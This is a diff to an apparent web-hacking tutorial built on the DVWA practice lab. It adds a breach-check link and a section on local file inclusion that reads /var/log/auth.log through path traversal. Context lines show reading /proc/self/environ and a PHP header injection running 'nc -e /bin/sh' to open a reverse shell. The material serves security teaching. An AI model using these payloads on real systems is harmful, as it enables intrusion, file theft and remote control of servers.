@@ -23,6 +23,7 @@ First things first. You must know your target! Here are some tools to gather inf
 * [BuiltWith](http://builtwith.com/) - Find information about the technology used
 * [Robtex DNS Lookup](http://robtex.com) - Comprehensive DNS information about the target site
 * [Subdomain Discovery](https://github.com/guelfoweb/knock) - Subdomain scanner (requires git clone)
+* [Password Database](https://haveibeenpwned.com/) - check if your email has been leaked as a result of a previous exploit in a service you are signed up to
 
 Basic usage of Knock outlined below:
 
@@ -105,3 +106,17 @@ Since the fi example in DVWA exploits the file inclusion we can easily read the 
 So there is a file in linux / unix systems that can be used to read all enviornment variables. The file is `/proc/self/environ`. We can pass that to the server and read the contents like so: `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ`
 
 So with this we can intercept the request (using Burp) and change the 'User-Agent' header value to some php script that we want to execute. Basically we can set up a reverse connection (similar to the code execution example above) again using the following injected code into the header: `<? passthru('nc -e /bin/sh 10.0.2.15 8081');?>`
+
+## More local file explot examples
+
+Lets try and load a log file that shows login attempts to the server, which is the file `/var/log/auth.log`. So we change our url to be as follows: `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log`
+
+
+
+
+
+
+
+
+
+
